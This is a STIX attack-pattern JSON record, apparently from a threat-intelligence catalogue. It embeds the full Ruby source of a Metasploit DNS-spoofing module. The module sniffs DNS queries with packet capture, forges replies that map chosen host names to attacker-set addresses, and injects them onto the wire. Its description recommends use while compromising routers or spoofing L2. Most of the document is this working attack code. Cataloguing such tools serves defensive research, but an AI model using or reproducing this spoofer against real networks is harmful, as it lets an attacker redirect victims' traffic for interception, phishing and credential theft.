{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dd551ec4-0260-4e30-8a31-fa8701fa9906",
    "created": "2024-08-14T16:32:54.38081Z",
    "modified": "2024-08-14T16:32:54.380815Z",
    "name": "Native DNS Spoofer (Example)",
    "description": " This module provides a Rex based DNS service to resolve queries intercepted via the capture mixin. Configure STATIC_ENTRIES to contain host-name mappings desired for spoofing using a hostsfile or space/semicolon separated entries. In the default configuration, the service operates as a normal native DNS server with the exception of consuming from and writing to the wire as opposed to a listening socket. Best when compromising routers or spoofing L2 in order to prevent return of the real reply which causes a race condition. The method by which replies are filtered is up to the user (though iptables works fine). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/spoof/dns/native_spoofer.rb",
            "external_id": "native_spoofer.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Capture\n  include Msf::Exploit::Remote::DNS::Client\n  include Msf::Exploit::Remote::DNS::Server\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Native DNS Spoofer (Example)',\n        'Description' => %q{\n          This module provides a Rex based DNS service to resolve queries intercepted\n          via the capture mixin. Configure STATIC_ENTRIES to contain host-name mappings\n          desired for spoofing using a hostsfile or space/semicolon separated entries.\n          In the default configuration, the service operates as a normal native DNS server\n          with the exception of consuming from and writing to the wire as opposed to a\n          listening socket. Best when compromising routers or spoofing L2 in order to\n          prevent return of the real reply which causes a race condition. The method\n          by which replies are filtered is up to the user (though iptables works fine).\n        },\n        'Author' => 'RageLtMan <rageltman[at]sempervictus>',\n        'License' => MSF_LICENSE,\n        'References' => [],\n        'Actions' => [\n          [ 'Service', { 'Description' => 'Serve DNS entries' } ]\n        ],\n        'PassiveActions' => [\n          'Service'\n        ],\n        'DefaultAction' => 'Service',\n        'Notes' => {\n          'Reliability' => [],\n          'SideEffects' => [],\n          'Stability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('FILTER', [false, 'The filter string for capturing traffic', 'dst port 53']),\n        OptAddress.new('SRVHOST', [true, 'The local host to listen on for DNS services.', '127.0.2.2'])\n      ]\n    )\n\n    deregister_options('PCAPFILE')\n  end\n\n  #\n  # Wrapper for service execution and cleanup\n  #\n  def run\n    start_service\n    capture_traffic\n    service.wait\n  rescue Rex::BindFailed => e\n    print_error \"Failed to bind to port #{datastore['RPORT']}: #{e.message}\"\n  end\n\n  def cleanup\n    super\n    @capture_thread.kill if @capture_thread\n    close_pcap\n  end\n\n  #\n  # Generates reply with src and dst reversed\n  # Maintains original packet structure, proto, etc, changes ip_id\n  #\n  def reply_packet(pack)\n    rep = pack.dup\n    rep.eth_dst, rep.eth_src = rep.eth_src, rep.eth_dst\n    rep.ip_dst, rep.ip_src = rep.ip_src, rep.ip_dst\n    if pack.is_udp?\n      rep.udp_dst, rep.udp_src = rep.udp_src, rep.udp_dst\n    else\n      rep.tcp_dst, rep.tcp_src = rep.tcp_src, rep.tcp_dst\n    end\n    rep.ip_id = StructFu::Int16.new(rand(2**16))\n    return rep\n  end\n\n  #\n  # Configures capture and handoff\n  #\n  def capture_traffic\n    check_pcaprub_loaded\n    ::Socket.do_not_reverse_lookup = true # Mac OS X workaround\n    open_pcap({ 'FILTER' => datastore['FILTER'] })\n    @capture_thread = Rex::ThreadFactory.spawn('DNSSpoofer', false) do\n      each_packet do |pack|\n        begin\n          parsed = PacketFu::Packet.parse(pack)\n        rescue StandardError => e\n          vprint_status('PacketFu could not parse captured packet')\n          elog('PacketFu could not parse captured packet', error: e)\n        end\n\n        begin\n          reply = reply_packet(parsed)\n          service.dispatch_request(reply, parsed.payload)\n        rescue StandardError => e\n          vprint_status('Could not process captured packet')\n          elog('Could not process captured packet', error: e)\n        end\n      end\n    end\n  end\n\n  #\n  # Creates Proc to handle incoming requests\n  #\n  def on_dispatch_request(cli, data)\n    return unless cli.is_a?(PacketFu::Packet)\n\n    peer = \"#{cli.ip_daddr}:\" << (cli.is_udp? ? cli.udp_dst.to_s : cli.tcp_dst.to_s)\n\n    # Deal with non DNS traffic\n    begin\n      req = Packet.encode_drb(data)\n    rescue StandardError => e\n      print_error(\"Could not decode payload segment of packet from #{peer}, check log\")\n      dlog e.backtrace\n      return\n    end\n\n    answered = []\n    # Find cached items, remove request from forwarded packet\n    req.question.each do |ques|\n      cached = service.cache.find(ques.qname, ques.qtype.to_s)\n      if cached.empty?\n        next\n      else\n        cached.each do |subcached|\n          req.add_answer(subcached) unless req.answer.include?(subcached)\n        end\n\n        answered << ques\n      end\n    end\n\n    if (answered.count < req.question.count) && service.fwd_res\n      if req.header.rd == 0\n        vprint_status(\"Recursion forbidden in query for #{req.question.first.name} from #{peer}\")\n      else\n        forward = req.dup\n        forward.question.delete_if { |question| answered.include?(question) }\n        begin\n          forwarded = service.fwd_res.send(Packet.validate(forward))\n        rescue NoResponseError\n          vprint_error('Did not receive a response')\n          return\n        end\n\n        unless service.cache.nil?\n          forwarded.answer.each do |ans|\n            rstring = ans.respond_to?(:address) ? \"#{ans.name}:#{ans.address}\" : ans.name\n            vprint_status(\"Caching response #{rstring} #{ans.type}\")\n            service.cache.cache_record(ans)\n          end\n        end\n\n        # Merge the answers and use the upstream response\n        req.answer.each do |answer|\n          forwarded.add_answer(answer) unless forwarded.answer.include?(answer)\n        end\n        req = forwarded\n      end\n    end\n\n    req.header.qr = true\n    service.send_response(cli, req.encode)\n  end\n\n  #\n  # Creates Proc to handle outbound responses\n  #\n  def on_send_response(cli, data)\n    return unless cli.is_a?(PacketFu::Packet)\n\n    cli.payload = data\n    cli.recalc\n    inject cli.to_s\n    sent_info(cli, data) if datastore['VERBOSE']\n  end\n\n  #\n  # Prints information about spoofed packet after injection to reduce latency of operation\n  # Shown to improve response time by >50% from ~1ms -> 0.3-0.4ms\n  #\n  def sent_info(cli, data)\n    net = Packet.encode_net(data)\n    peer = \"#{cli.ip_daddr}:\" << (cli.is_udp? ? cli.udp_dst.to_s : cli.tcp_dst.to_s)\n    asked = net.question.map { |q| q.qName.delete_suffix('.') }.join(', ')\n    vprint_good(\"Sent packet with header:\\n#{cli.inspect}\")\n    vprint_good(\"Spoofed records for #{asked} to #{peer}\")\n  end\n\nend\n"
}